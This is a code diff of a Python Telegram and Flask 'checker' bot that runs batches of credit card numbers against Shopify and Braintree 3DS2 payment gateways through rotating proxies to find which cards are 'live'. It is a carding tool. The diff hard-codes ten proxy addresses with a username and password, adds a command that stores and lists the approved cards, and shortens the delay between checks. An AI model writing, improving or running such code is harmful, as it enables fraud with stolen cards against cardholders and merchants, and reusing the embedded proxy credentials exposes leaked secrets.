@@ -30,7 +30,7 @@ def banner():
    ╚═════╝    ╚═╝       ╚═════╝╚═╝  ╚═╝
 """
     for l in art.strip("\n").split("\n"): print(grad(l))
-    print(f"  {C.D}Shopify + Braintree 3DS2  |  {C.B}{C.GOLD}v5.0{C.R}{C.D}  |  W2 + AddProxy{C.R}\n")
+    print(f"  {C.D}Shopify + Braintree 3DS2  |  {C.B}{C.GOLD}v6.0{C.R}{C.D}  |  Live Status + Non-blocking{C.R}\n")
 
 # ---------- Config ----------
 BATCH_MAX      = 1000
@@ -41,13 +41,26 @@ RESULT_DIR     = "./results"
 os.makedirs(RESULT_DIR, exist_ok=True)
 
 TG_W           = 2          # total workers / lanes
-CARD_DELAY     = 2.0        # ကဒ်တစ်ခုနဲ့တစ်ခုကြား စောင့်ချိန် (စက္ကန့်)
+CARD_DELAY     = 1.0        # ကဒ်တစ်ခုနဲ့တစ်ခုကြား စောင့်ချိန် (စက္ကန့်)
 
 # ---------- Proxies ----------
 RAW_PROXIES=[
-    # မင်းရဲ့ Proxy တွေ ဒီမှာ ထည့်ထားပါ (သို့မဟုတ် Bot ကနေ /addproxy နဲ့ ထည့်နိုင်တယ်)
+    "104.207.54.16:3129:wubhw1b4iru0:os8xs3kepzt50ul",
+    "216.26.230.121:3129:wubhw1b4iru0:os8xs3kepzt50ul",
+    "45.3.55.235:3129:wubhw1b4iru0:os8xs3kepzt50ul",
+    "65.111.10.46:3129:wubhw1b4iru0:os8xs3kepzt50ul",
+    "104.207.32.217:3129:wubhw1b4iru0:os8xs3kepzt50ul",
+    "45.3.35.7:3129:wubhw1b4iru0:os8xs3kepzt50ul",
+    "45.3.35.95:3129:wubhw1b4iru0:os8xs3kepzt50ul",
+    "209.50.174.23:3129:wubhw1b4iru0:os8xs3kepzt50ul",
+    "65.111.6.242:3129:wubhw1b4iru0:os8xs3kepzt50ul",
+    "65.111.5.198:3129:wubhw1b4iru0:os8xs3kepzt50ul"
 ]
 WORKING=[]; _PI=0; _PLK=threading.Lock()
+
+# Live tracking variables
+LIVE_CARDS = []
+LIVE_LOCK = threading.Lock()
 
 def _tp(url):
     p={"http":url,"https":url}
@@ -68,26 +81,30 @@ def validate_proxies(proxies_to_check):
     
     def run(raw):
         nonlocal done
-        raw = raw.strip()
-        # user:pass@ip:port ကို ip:port:user:pass ပြောင်းတာ
-        if "@" in raw and ":" in raw.split("@")[0]:
-            creds, host = raw.split("@")
-            u, pw = creds.split(":")
-            ip, pt = host.split(":")
-            raw = f"{ip}:{pt}:{u}:{pw}"
+        raw = raw.strip().replace('"', '').replace("'", "").replace(",", "")
+        found=None
+        
+        try:
+            if "@" in raw:
+                creds, host = raw.split("@")
+                u, pw = creds.split(":")
+                ip, pt = host.split(":")
+                test_url = f"http://{u}:{pw}@{ip}:{pt}"
+            elif len(raw.split(":")) == 4:
+                ip, pt, u, pw = raw.split(":")
+                test_url = f"http://{u}:{pw}@{ip}:{pt}"
+            elif len(raw.split(":")) == 2:
+                test_url = f"http://{raw}"
+            else:
+                raise ValueError
+        except:
+            with lk:
+                done+=1
+            return
 
-        parts=raw.split(":"); found=None
-        if len(parts)==4:
-            ip,pt,u,pw=parts
-            for sch in ("http","socks5h","socks5"):
-                url=f"{sch}://{u}:{pw}@{ip}:{pt}"
-                if _tp(url): found={"url":url,"raw":raw,"sch":sch}; break
-        elif len(parts)==2:
-            ip,pt=parts
-            for sch in ("http","socks5h","socks5"):
-                url=f"{sch}://{ip}:{pt}"
-                if _tp(url): found={"url":url,"raw":raw,"sch":sch}; break
-                
+        if _tp(test_url): 
+            found={"url":test_url,"raw":raw,"sch":"http"}
+            
         with lk:
             done+=1
             if found: w.append(found)
@@ -485,15 +502,10 @@ def parse_batch(raw):
 
 # ---------- Flask ----------
 app=Flask(__name__)
-KEYS={f"AFUONA_{x}":f"client_{i+1:02d}" for i,x in enumerate([
-    "a7K9mQ2xLp4Rt8Vw","b3N8jH5yFd6Gs1Zc","c9P2vM7wQe3Xk5Lb","d4R6tY1uJn8Bf2Hm",
-    "e8W3sK5oPa9Cd7Gv","f1Q7zL4iXr2Nt6Jb","g5T9yU8hMv3Wp1Kc","h2J6rE4nBx7Ls9Qd",
-    "i7V1kP3aZt5Fm8Nw","j9X4wQ6cYd2Hb5Ru"])}
 
 @app.route('/')
 def root():
-    return jsonify({"app":"checker","status":"running","proxies":len(WORKING),
-                    "endpoints":{"/":"this","/shopi":"shopify","/bt":"braintree"}})
+    return jsonify({"app":"checker","status":"running","proxies":len(WORKING)})
 
 @app.route('/health')
 def health(): return jsonify({"ok":True})
@@ -566,20 +578,22 @@ def _help():
     return ("<b>🔥 Checker Bot</b>\n\n"
             "▸ <code>/check cc</code> or <code>/check cc site</code> — Shopify\n"
             "▸ <code>/bt cc</code> — Braintree\n"
-            "▸ <code>/addproxy ip:port:user:pass</code> — Proxy အသစ်ထည့်ရန်\n"
-            "▸ multi-line / comma separated supported\n"
-            "▸ <code>/queue</code> · <code>/status</code> · <code>/help</code>\n\n"
+            "▸ <code>/addproxy ip:port:user:pass</code> — Proxy ထည့်ရန်\n"
+            "▸ <code>/r</code> — Live ဖြစ်နေတဲ့ ကဒ်တွေ ပြရန်\n"
+            "▸ <code>/status</code> — လက်ရှိ အခြေအနေ ကြည့်ရန်\n"
+            "▸ multi-line / comma separated supported\n\n"
             "<b>Example:</b>\n"
-            "<code>/bt 4111111111111111|12|2030|123</code>\n"
-            "<code>5555555555554444|01|2031|456</code>")
+            "<code>/bt 4111111111111111|12|2030|123</code>")
 
 def _status():
     with _slk:
-        return (f"<b>📊 Status</b>\n▸ Workers: <b>{TG_W}</b>\n▸ Queued: <b>{_st['q']}</b>\n"
+        real_queue = sum(lane.qsize() for lane in _lanes)
+        return (f"<b>📊 Status</b>\n▸ Workers: <b>{TG_W}</b>\n▸ Remaining Queue: <b>{real_queue}</b>\n"
                 f"▸ Running: <b>{_st['r']}</b>\n▸ Done: <b>{_st['p']}</b>\n"
                 f"▸ Failed: <b>{_st['f']}</b>\n▸ Live: <b>{_st['live']}</b>\n"
                 f"▸ Dead: <b>{_st['dead']}</b>\n▸ Proxies: <b>{len(WORKING)}</b>\n"
-                f"▸ Active batches: <b>{len(_batches)}</b>")
+                f"▸ Active batches: <b>{len(_batches)}</b>\n"
+                f"\n▸ <i>Bot is working in background...</i>")
 
 def _result_block(rows):
     out=[]
@@ -655,53 +669,39 @@ def _worker(wid, lane):
             row={"icon":"✅" if succ else "❌","resp":cl,"cc":ccs,"gw":gw,
                  "price":prc,"cur":cur,"el":el,"bin":bin_line(p['cc']),
                  "succ":succ,"idx":idx}
+                 
+            # LIVE Card တွေကို သိမ်းထားမယ်
+            if succ and "DECLINED" not in cl.upper() and "OTP" not in cl.upper():
+                with LIVE_LOCK:
+                    LIVE_CARDS.append(row)
 
-            is_error = any(err in cl.upper() for err in ["LOOKUP ERROR", "NO SESSION", "BAD JSON", "REQ FAILED", "PROXY", "TIMEOUT", "ERROR"])
-            
-            rows_to_send=[]; prog=False; finished=False; done_n=0; total=0; retries=[]
+            with _slk:
+                _st["p"]+=1
+                if succ: _st["live"]+=1
+                else:    _st["dead"]+=1
 
-            if is_error and bid is not None:
-                with _batch_lock:
-                    b=_batches.get(bid)
-                    if b:
-                        b["retry_queue"].append((mode,cid,mid,site,ccs,None,bid,idx))
-                        row = None 
-            else:
-                with _slk:
-                    _st["p"]+=1
-                    if succ: _st["live"]+=1
-                    else:    _st["dead"]+=1
-
-            if row is not None:
-                with _batch_lock:
-                    b=_batches.get(bid) if bid is not None else None
-                    if b:
-                        b["done"].append(row)
-                        b["pending_rows"].append(row)
-                        done_n=len(b["done"]); total=b["total"]
-                        flush = len(b["pending_rows"])>=MSG_PER_BATCH
-                        prog  = (done_n % PROGRESS_EVERY==0 and done_n<total)
-                        finished = (done_n==total)
-                        if flush:
-                            rows_to_send=list(b["pending_rows"])
-                            b["pending_rows"].clear()
+            rows_to_send=[]; prog=False; finished=False; done_n=0; total=0
+            with _batch_lock:
+                b=_batches.get(bid) if bid is not None else None
+                if b:
+                    b["done"].append(row)
+                    b["pending_rows"].append(row)
+                    done_n=len(b["done"]); total=b["total"]
+                    flush = len(b["pending_rows"])>=MSG_PER_BATCH
+                    prog  = (done_n % PROGRESS_EVERY==0 and done_n<total)
+                    finished = (done_n==total)
+                    if flush:
+                        rows_to_send=list(b["pending_rows"])
+                        b["pending_rows"].clear()
 
             if rows_to_send:
                 _send(cid,_result_block(rows_to_send),rt=mid,pm="HTML")
             if prog:
                 _send(cid,f"⏳ <b>Batch #{bid}</b> · {done_n}/{total} done",rt=mid,pm="HTML")
-                
             if finished:
                 with _batch_lock:
-                    b=_batches.get(bid)
-                    if b and b.get("retry_queue"):
-                        retries = list(b["retry_queue"])
-                        b["retry_queue"].clear()
-                        finished = False
-                    else:
-                        b=_batches.pop(bid,None)
-                
-                if finished and b:
+                    b=_batches.pop(bid,None)
+                if b:
                     if b["pending_rows"]:
                         _send(cid,_result_block(b["pending_rows"]),rt=mid,pm="HTML")
                     _send(cid,_batch_summary(b),rt=mid,pm="HTML")
@@ -710,11 +710,6 @@ def _worker(wid, lane):
                         _send_file(cid,path, caption=f"batch #{b['bid']} results · {len(b['done'])} cards", rt=mid)
                     except Exception as e:
                         print(f"{C.D}[TG] dump: {e}{C.R}")
-                        
-            for r_item in retries:
-                _lanes[lane].put(r_item)
-                with _slk: _st["q"]+=1
-
         except Exception as e:
             with _slk: _st["f"]+=1
             try: _send(cid,f"⚠️ {_esc(e)}",rt=mid,pm="HTML")
@@ -743,7 +738,7 @@ def _enqueue_batch(mode,cid,mid,site,ccs_list,invalid):
         _batches[bid]={"bid":bid,"cid":cid,"mid":mid,"mode":mode,"site":site,
                        "cards":list(ccs_list),"done":[],"pending_rows":[],
                        "invalid":list(invalid),"total":len(ccs_list),
-                       "lane":lane, "retry_queue": []}
+                       "lane":lane}
     hdr=(f"📥 <b>Batch #{bid}</b> · {len(ccs_list)} card(s) queued · lane {lane+1}"
          + (f"\n⚠️ {len(invalid)} invalid skipped" if invalid else ""))
     _send(cid,hdr,rt=mid,pm="HTML")
@@ -762,6 +757,16 @@ def _handle(u):
         return
     txt=(m.get("text") or "").strip(); mid=m.get("message_id")
     if not txt: return
+    
+    if txt.startswith("/r"):
+        with LIVE_LOCK:
+            if not LIVE_CARDS:
+                _send(cid, "❌ Live ဖြစ်တဲ့ ကဒ် မရှိသေးပါဘူး။", rt=mid, pm="HTML"); return
+            msg = f"<b>🔥 Live Cards ({len(LIVE_CARDS)})</b>\n\n"
+            msg += _result_block(LIVE_CARDS[-10:]) # နောက်ဆုံး ၁၀ ခုပဲ ပြမယ်
+            _send(cid, msg, rt=mid, pm="HTML")
+        return
+
     if txt in ("/start","/help"):
         _send(cid,_help(),rt=mid,pm="HTML"); return
     if txt in ("/queue","/status"):
@@ -770,7 +775,7 @@ def _handle(u):
     if txt.startswith("/addproxy"):
         raw=txt[9:].strip()
         if not raw:
-            _send(cid,"❌ <code>/addproxy ip:port</code> or <code>/addproxy ip:port:user:pass</code>",rt=mid,pm="HTML"); return
+            _send(cid,"❌ <code>/addproxy ip:port:user:pass</code>",rt=mid,pm="HTML"); return
         new_px = [line.strip() for line in raw.split("\n") if line.strip()]
         global WORKING
         _send(cid, f"🔄 Testing {len(new_px)} proxies...", rt=mid, pm="HTML")
